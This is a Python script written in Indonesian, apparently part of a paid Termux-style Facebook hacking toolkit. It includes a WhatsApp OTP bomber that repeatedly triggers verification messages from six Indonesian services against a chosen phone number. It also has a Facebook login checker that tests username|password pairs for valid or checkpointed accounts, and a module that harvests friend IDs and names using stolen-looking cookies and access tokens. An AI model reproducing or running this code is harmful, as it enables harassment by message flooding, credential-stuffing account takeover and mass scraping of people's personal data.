	prints(nel(f'{P2}Contoh : {H2}+6281234567xxx{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
	nomor = input(f"[+] input no hp :\033[32m +62").replace("+62","")
	if nomor == "":
		pass
	else:
		while True:
			for _ in track(range(100), description=f'{P2}tunggu sedang kirim pesan ke WhatsApp...'):process_data1()
			sxp_wa()
			
class sxp_wa:

	def __init__(self):
		self.req = requests.Session()
		self.main()

	def wa_otp_1(self, no):
		nickname = random.choice(
					  [
					    "fahmi",
					    "xzc0der",
					    "bed3bah",
					    "xmanz"
					  ]
					 )
		angka = random.randint(
					111,
					999
				       )
		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
			headers = {
				    "Host": "wong.kitabisa.com",
				    "x-ktbs-platform-name": "pwa",
				    "origin": "https://account.kitabisa.com",
				    "x-ktbs-time": "1611020248",
				    "user-agent": agent,
				    "x-ktbs-api-version": "1.0.0",
				    "accept": "application/json",
				    "x-ktbs-client-name": "kanvas",
				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
				    "x-ktbs-client-version": "1.0.0",
				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
				    "version": "3.4.0",
				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				   },
			json = {
				 "full_name": nickname+str(angka),
				 "username": f"0{no}",
				 "otp_type": "whatsapp"
				}
		).text

	def wa_otp_2(self, no):
		__req__ = self.req.get(
			f"https://m.redbus.id/api/getOtp?number={no}&cc=62&whatsAppOpted=true"
		).text

	def wa_otp_3(self, no):
		__req__ = self.req.post("https://api.bukuwarung.com/api/v1/auth/otp/send",
			headers = {
				    "Accept": "application/json",
				    "X-APP-VERSION-NAME": "3.4.0",
				    "X-APP-VERSION-CODE": "3399",
				    "Content-Type": "application/json; charset=UTF-8",
				    "Host": "api.bukuwarung.com",
				    "Connection": "Keep-Alive",
				    "Accept-Encoding": "gzip",
				    "User-Agent": agent
				   },
			json = {
				 "action": "LOGIN_OTP",
				 "countryCode": "62",
				 "deviceId": "00000177-142d-f1a2-bac4-57a9039fdc4d",
				 "method": "WA",
				 "phone": no
				}
		).text

	def wa_otp_4(self, no):
		__req__ = self.req.post("https://evermos.com/api/client/request-code",
			headers = {
				    "user-agent": agent
				  },
			data = {
				 "telephone": f"62{no}",
				 "type": 0
				}
		).text

	def wa_otp_5(self, no):
		__req__ = self.req.post("https://wapi.ruparupa.com/auth/generate-otp",
			headers = {
				    "Host": "wapi.ruparupa.com",
				    "Connection": "keep-alive",
				    "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOGZlY2VjZmYtZTQ1Zi00MTVmLWI2M2UtMmJiMzUyZmQ2NzhkIiwiaWF0IjoxNTkzMDIyNDkyLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.fETKXQ0KyZdksWWsjkRpjiKLrJtZWmtogKyePycoF0E",
				    "Accept": "application/json",
				    "Content-Type": "application/json",
				    "X-Company-Name": "odi",
				    "User-Agent": agent,
				    "user-platform": "mobile",
				    "X-Frontend-Type": "mobile",
				    "Origin": "https://m.ruparupa.com",
				    "Referer": "https://m.ruparupa.com/verification?page=otp-choices",
				    "Accept-Encoding": "gzip, deflate, br",
				    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				   },
			json = {
				 "phone": f"0{no}",
				 "action": "register",
				 "channel": "chat",
				 "email": "",
				 "customer_id": "0",
				 "is_resend": 0
				}
		).text

	def wa_otp_6(self, no):
		headers = {
			    "Connection": "keep-alive",
			    "Accept": "application/json, text/javascript, */*; q=0.01",
			    "Origin": "https://accounts.tokopedia.com",
			    "X-Requested-With": "XMLHttpRequest",
			    "User-Agent": agent,
			    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
			    "Accept-Encoding": "gzip, deflate",
			   }
		site = self.req.get("https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn="+ no +"&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D", headers = headers).text
		search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
		data = {
			 "otp_type": "116",
			 "msisdn": no,
			 "tk": search,
			 "email": "",
			 "original_param": "",
			 "user_id": "",
			 "signature": "",
			 "number_otp_digit": "6",
			}
		__req__ = self.req.post(
				"https://accounts.tokopedia.com/otp/c/ajax/request-wa", headers = headers, data = data
	   ).text

	def main(self):
		self.wa_otp_1(nomor)
		self.wa_otp_2(nomor)
		self.wa_otp_3(nomor)
		self.wa_otp_4(nomor)
		self.wa_otp_5(nomor)
		self.wa_otp_6(nomor)
		prints(nel(f'{P2}Sukses spam WA ke no : {K2}+62{nomor}',width=80,padding=(0,7),style=f"{color_panel}")) 
		
		
#----------[BUAT PASANG A2F ACCOUNT FACEBOOK]----------#
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests as req, re
from bs4 import BeautifulSoup as par

headers = {
	"Host":"mbasic.facebook.com",
	"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
	"origin":"https://www.facebook.com",
	"referer":"https://www.facebook.com",
	"sec-ch-ua":'";Not A Brand";v="99", "Chromium";v="94"',
	"upgrade-insecure-requests":"1",
	"user-agent":"Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5"
}

ses = req.Session()
ses.headers.update(headers)

class Main(object):
	
	def __init__(self,coki):
		self.coki = {"cookie":coki}
	def cek(self):
		try:
			r = par(
				ses.get(
					"https://mbasic.facebook.com/security/2fac/setup/intro/metadata/?source=1",cookies=self.coki
				).text, 'html.parser'
			)
		except req.exceptions.TooManyRedirects:
			r = par(
				req.get(
					"https://mbasic.facebook.com/security/2fac/setup/intro/metadata/?source=1",cookies=self.coki
				).text, 'html.parser'
			)
		try:
			lanjut = r.find(
				"a",string="Gunakan Aplikasi Autentikasi"
			).get(
				"href"
			)
		except:
			prints(nel(f'{P2}akun anda sudah terpasang a2f{P2}',width=80,padding=(0,7),style=f"{color_panel}"));exit()
		try:
			__r = ses.get(lanjut,cookies=self.coki).text
		except req.exceptions.TooManyRedirects:
			__r = req.get(lanjut,cookies=self.coki).text
		co = par(__r, 'html.parser')
		try:
			kode = self.get_kode(co)
			prints(nel(f'{P2}Key authen : {H2}{kode}\n{P2}Masukan key authen di aplikasi authen 2 faktor{P2}',width=80,padding=(0,7),style=f"{color_panel}"))
		except:
			if "Demi keamanan, masukkan ulang kata sandi Anda untuk melanjutkan." in __r:
				prints(nel(f'{P2}Demi keamanan, masukkan kata sandi Facebook anda untuk melanjutkan.\nNote : {M2}Jika terjadi kesalahan masukan kode authen dan terjadi sinyal internet tidak ada, jalanin script lagi dan masukan cookie lagi terimakasih{P2}',width=80,padding=(0,7),style=f"{color_panel}"))
				sandi = input("[+] Password facebook: ")
				lanjut = co.find(
					'form',{
						'method':'post'
					}
				)
				memek = {}
				lst = ["fb_dtsg","jazoest","save"]
				for x in lanjut:
					if x.get("name") in lst:
						memek.update(
							{
								x.get(
									"name"
								):x.get(
									"value"
								)
							}
						)
				memek.update(
					{
						"pass":sandi
					}
				)
				response = ses.post(
					lanjut.get(
						"action"
					),cookies=self.coki,data=memek
				).text
				if "Kata sandi yang Anda masukkan tidak benar." in response:
					prints(nel(f'{P2}Kata sandi yang Anda masukkan tidak benar.{P2}',width=80,padding=(0,7),style=f"{color_panel}"));exit()
				else:
					try:
						kode = self.get_kode(response)
					except IndexError:
						prints(nel(f'{P2}Facebook terkena checkpoint{P2}',width=80,padding=(0,7),style=f"{color_panel}"));exit()
				prints(nel(f'{P2}Key authen : {H2}{kode}\n{P2}Masukan key authen di aplikasi authen 2 faktor{P2}',width=80,padding=(0,7),style=f"{color_panel}"))
			else:
				prints(nel(f'{P2}Facebook terkena checkpoint{P2}',width=80,padding=(0,7),style=f"{color_panel}"));exit()
		self.masuk(co)

class Pasang(Main):
	
	def pasang(self,link,data_code):
		return ses.post(
			"https://mbasic.facebook.com"+str(
				link
			),data=data_code,cookies=self.coki
		).text
	def get_kode(self,res):
		kode = re.findall(
			'\<div\ class\=\".*?\"\>Atau masukkan kode ini ke aplikasi autentikasi Anda<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>\<\/div\>',str(
				res
			)
		)[0]
		return kode
	def kode_pemulihan(self,kontol):
		num = 0
		for x in kontol.find_all('span'):
			if(
				re.findall(
					'\d+\s\d+',str(
						x
					)
				)
			):
				num+=1
				if(num==1):
					print(f"➛ {x.text}")
				else:
					print(f"➛ {x.text}")
	def get_kode_pemulihan(self):
		waifu_wangy = {
			"Host":"mbasic.facebook.com",
			"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			"content-type":"application/x-www-form-urlencoded",
			"origin":"https://www.facebook.com",
			"referer":"https://www.facebook.com",
			"upgrade-insecure-requests":"2",
			"user-agent":"Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5"
		}
		ses.headers.update(waifu_wangy)
		__res = ses.get("https://mbasic.facebook.com/security/2fac/factors/recovery-code/",cookies=self.coki).text
		kontol = par(__res, 'html.parser')
		if "Gunakan kode pemulihan untuk login jika Anda kehilangan ponsel atau tidak dapat menerima kode verifikasi melalui pesan teks atau aplikasi autentikasi." in __res:
			data = {}
			lst = ["fb_dtsg","jazoest","reset"]
			for x in kontol.find(
				'form',{
					'method':'post'
				}
			):
				if x.get('name') in lst:
					data.update(
						{x.get(
							'name'
						):x.get(
							'value'
						)
					}
				)
			data.update(
				{
					"":"Dapatkan Kode"
				}
			)
			kontol = par(
				ses.post(
					"https://mbasic.facebook.com/security/2fac/factors/recovery-code/",cookies=self.coki,data=data
				).text, 'html.parser'
			)
			self.kode_pemulihan(kontol)
		else:
			self.kode_pemulihan(kontol)
	def masuk(self,co):
		data = {}
		masuk = input("[+] Masukan kode authen: ")
		lst = ["fb_dtsg","jazoest","code_handler_type","confirmButton"]
		lanjut = co.find(
			'form',{
				'method':'post'
			}
		)
		for x in lanjut:
			if x.get('name') in lst:
				data.update(
					{x.get(
						'name'
					):x.get(
						'value'
					)
				}
			)	
		data.update(
			{
				'confirmButton':'Lanjutkan'
			}
		)
		res = par(
			ses.post(
				'https://mbasic.facebook.com'+str(
					lanjut.get(
						"action"
					)
				),cookies=self.coki,data=data
			).text, 'html.parser'
		)
		data.clear()
		lanjut = res.find(
			"form",{
				"id":"input_form"
			}
		)
		lst = ["fb_dtsg","jazoest"]
		for x in lanjut:
			if x.get("name") in lst:
				data.update(
					{x.get(
						"name"
					):x.get(
						"value"
					)
				}
			)
		data.update({
			"code":masuk,
			"submit_code_button":"Lanjutkan"
		})
		response = self.pasang(
			lanjut.get(
				"action"
			),data
		)
		if "checkpoint" in response:
			prints(nel(f'{P2}Ops akun terkena checkpoint{P2}',width=80,padding=(0,7),style=f"{color_panel}"));exit()
		elif "Autentikasi Dua Faktor Aktif" in response:
			prints(nel(f'{P2}Selamat a2f Berhasil di pasang{P2}',width=80,padding=(0,7),style=f"{color_panel}"))
			print("[+] Kode pemulihan: ")
			self.get_kode_pemulihan()
		else:
			prints(nel(f'{P2}Text: {H2}%s{P2}'%(response),width=80,padding=(0,7),style=f"{color_panel}"))
			print("[+] ",response)
			prints(nel(f'{P2}Ada yang salah di script, coba laporkan ke Developer. Copy text di atas! Kirim ke wa 6289530656600{P2}',width=80,padding=(0,7),style=f"{color_panel}"));exit()

#----------[BUAT CHEK ACCOUNT FACEBOOK]----------#
import requests, re, os, sys
from bs4 import BeautifulSoup

def clear():
	if "win" in sys.platform.lower():
		try:os.system("cls")
		except:pass
	else:
		try:os.system("clear")
		except:pass

ok,cp,error = 0,0,0

class Main:
	
	def __init__(self, useragent):
		self.ua = useragent
		self.host = "mbasic.facebook.com"

class Login(Main):
	
	def check_options(self, session, response, user, password):
		ref = BeautifulSoup(response.text, "html.parser")
		form = ref.find("form", {"method":"post", "enctype":True})
		data = {x.get("name"):x.get("value") for x in form.findAll("input", {"type":"hidden", "value":True})}
		data.update(
			{
				"submit[Continue]":"Lanjutkan"
			}
		)
		response = BeautifulSoup(session.post("https://mbasic.facebook.com"+str(form.get("action")), data=data).text, "html.parser")
		try:
			options = [x.string for x in response.find("select", {"id":"verification_method", "name":"verification_method"}).findAll("option")]
		except:
			options = []
			status = "a2f on"
		if(len(options)==0 and status!="a2f on"):
			status = "tap yes"
		elif(len(options)!=0):
			status = "checkpoint"
		else:
			status = "a2f on"
		output = {
			"account":f"{user}|{password}",
			"output":{
				"status":status,
				"options":options,
				"jumlah_opsi":len(options)
			}
		}
		return output
    
	def log_mfacebook(self, user, password):
		global ok,cp,error
		with requests.Session() as session:
			session.headers.update(
				{
					"host":self.host,
					"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
					"accept-encoding":"gzip, deflate",
					"accept-language":"en-US,en;q=0.9,id;q=0.8",
					"cache-control":"max-age=0",
					"upgrade-insecure-requests":"1",
					"user-agent":self.ua
				}
			)
			fbml = session.get("https://mbasic.facebook.com/fbml/ajax/dialog/")
			soup = BeautifulSoup(fbml.text, "html.parser")
			next_url = soup.findAll("a", {"class":True, "id":True})[1].get("href")
			session.headers.update(
				{
					"referer":"https://mbasic.facebook.com/fbml/ajax/dialog/",
				}
			)
			ref = BeautifulSoup(session.options(next_url).text, "html.parser")
			form = ref.find("form", {"method":"post", "id":"login_form"})
			data = {x.get("name"):x.get("value") for x in form.findAll("input", {"type":"hidden", "value":True})}
			nextTo = form.get("action")
			data.update(
				{
					"email":user,
					"pass":password,
					"login":"Masuk"
				}
			)
			response = session.post("https://mbasic.facebook.com"+str(nextTo), data=data, headers = {
				"content-length":"164",
				"content-type":"application/x-www-form-urlencoded",
				"origin":"https://mbasic.facebook.com",
				"referer":"https://mbasic.facebook.com"+str(nextTo)
			})
			try:
				if "checkpoint" in response.cookies:
					cp += 1
					output = self.check_options(session, response, user, password)
				elif "m_page_voice" in response.cookies:
					ok += 1
					output = {
						"account":f"{user}|{password}",
						"output":{
							"status":"OK",
							"options":None,
							"jumlah_opsi":None
						}
					}
				else:
					error += 1
					soup = BeautifulSoup(response.text, "html.parser")
					try:status = soup.find("div", {"id":"login_error"}).string
					except:status = "aktivitas berlebihan terdeteksi [spam]. segera on off mode pesawat!"
					output = {
						"account":f"{user}|{password}",
						"output":{
							"status":status,
							"options":False,
							"jumlah_opsi":False
						}
					}
			except Exception as e:print(response.text)
			return output
#--> DUMP UNLIMITED
class dump_fl_fl:
	def __init__(self):
		global dump
		dump = self.dump = []
		self.fail		= []
		self.pisah	   = pemisah
		self.xyz		 = requests.Session()
		self.cookie	  = {'cookie':open('.cok.txt','r').read()}
		self.token_eaag  = open('.token.txt','r').read()
		self.token_eaab  = open('.token.txt','r').read()
		self.main()
	def main(self):
		print('[+] ENTER PUBLIC ID USE COMMA TO ADD MORE ID (,)')
		print('[+] EXAMPLE : 10089782728927,100084938372627')
		id = input('[+] ENTER ID : ').split(',')
		print('[+]==============================================')
		for f in id:
			if f == 'me': io = f
			elif (re.findall("[a-zA-Z]",str(f))) : io = user_to_id(f)
			else : io = f
			self.cek(io)
		for d in self.fail:
			try: id.remove(d)
			except Exception as e: continue
		print('[+]==============================================')
		self.t1 = input('[?] DUMP OLD/MIX [t/m] : ').lower()
		self.t2 = input('[?] ENTER LIMIT : ')
		print('[+]==============================================')
		print("[+] PRESS [CTRL + C] TO SAVE")
		linex()
		try:
			for s in id:
				if s == 'me': io = s
				elif (re.findall("[a-zA-Z]",str(s))) : io = user_to_id(s)
				else : io = s
				lid = self.requ(io,'1')
			try:
				for h in lid:
					self.requ(h.split(self.pisah)[0],'2')
			except Exception as e:
				pass
		except KeyboardInterrupt: pass
		if len(self.dump) == 0: print('\r[!] DUMP UNSUCESSFULL')
		else: print('\r[+] COLLECTED %s ID'%(str(len(self.dump))))
	def cek(self,id):
		try: 
			nama  = str(self.xyz.get('https://graph.facebook.com/%s?fields=name&access_token=%s'%(id,self.token_eaag),cookies=self.cookie).json()['name'])
			teman = str(self.xyz.get('https://graph.facebook.com/%s/friends?fields=summary&limit=0&access_token=%s'%(id,self.token_eaab),cookies=self.cookie).json()['summary']['total_count'])
			print('[+] NAME/FRIENDS : %s / %s'%(nama,teman))
		except Exception as e:
			print('[+] ID/Private %s'%(id))
			self.fail.append(id)
	def requ(self,id,tp):
		url = 'https://graph.facebook.com/%s/friends?fields=id,name&limit=5000&access_token=%s'%(id,self.token_eaab)
		try:
			req = self.xyz.get(url,cookies=self.cookie).json()
			pen = [ '%s%s%s'%(y['id'],self.pisah,y['name']) for y in req['data']]
			sm_ = []
			sm  = []
			if self.t1 in ['1','01','t','tua']:
				for z in pen:
					sm.append(z)
					if len(sm) == int(self.t2): break
			else:
				for z in pen:
					sm_.insert(0,z)
				for z_ in sm_:
					sm.append(z_)
					if len(sm) == int(self.t2): break
				if tp == '1':
					return(sm)
				else:
					for h in sm:
						if h in self.dump:pass
						else:self.dump.append(h)
						animasi()
		except Exception as e: pass
		

#----------[BUAT RUN TOOLS SCRIPT INI]----------#
def make():
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.mkdir('/sdcard/dump')
	except:pass
	getkey()

#----------[BUAT EXPIRED SCRIPT]----------#
expired = ['20', '03', '2023']
saat_ini = datetime.now()
tgl = saat_ini.strftime('%d')
bln = saat_ini.strftime('%m')
thn = saat_ini.strftime('%Y')
waktu_new = (tgl+"-"+bln+"-"+thn)

if __name__=="__main__":
	tanggal = thn + bln + tgl
	exp = expired[2] + expired[1] + expired[0]
	if tanggal >= exp:
		os.system("clear")
		print('\033[0m')
		cetak(nel(f"""[[red]•[white]] Script Kadaluarsa Silahkan Beli Scriptnya ke Authour Asepitgans-Xc \n[[red]•[white]] WhatsApp : +6289530656600"""))
		sys.exit()
	else:
		os.system('git pull')
		make()
